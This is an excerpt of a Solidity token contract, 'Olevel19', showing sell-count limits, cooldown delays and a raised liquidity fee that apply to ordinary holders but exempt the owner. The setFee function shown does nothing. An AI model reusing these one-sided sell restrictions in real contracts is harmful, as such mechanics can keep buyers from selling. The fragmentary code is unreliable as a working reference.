...
contract Olevel19 is Context, IERC20, Ownable {
    ...
    string private _name = "Olevel19";
    string private _symbol = "19LEVEL";
    
    uint256 public _josh = 20;
    uint256 public _josh2 = 40;    
    ...
    uint256 public _maxSellAttempts = 5;

    uint256 public _totaldelay = 600; 
    uint256 public _initialdelay = 60; 
    uint256 public _furtherdelay = 60;
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (from != uniswapV2Pair && cooldownEnabled) {
                ...
                else if (sellnumber[from] == 1 || sellnumber[from] == 2 || sellnumber[from] == 3) { 
                    require (amount <= balanceOf(uniswapV2Pair).div(10000).mul(_josh));
                    sellnumber[from]++;
                    sellcooldown[from] = block.timestamp + _initialdelay;
                    _liquidityFee = 11;
    ...
    function setFee(uint256) private {
        _taxFee = _taxFee;
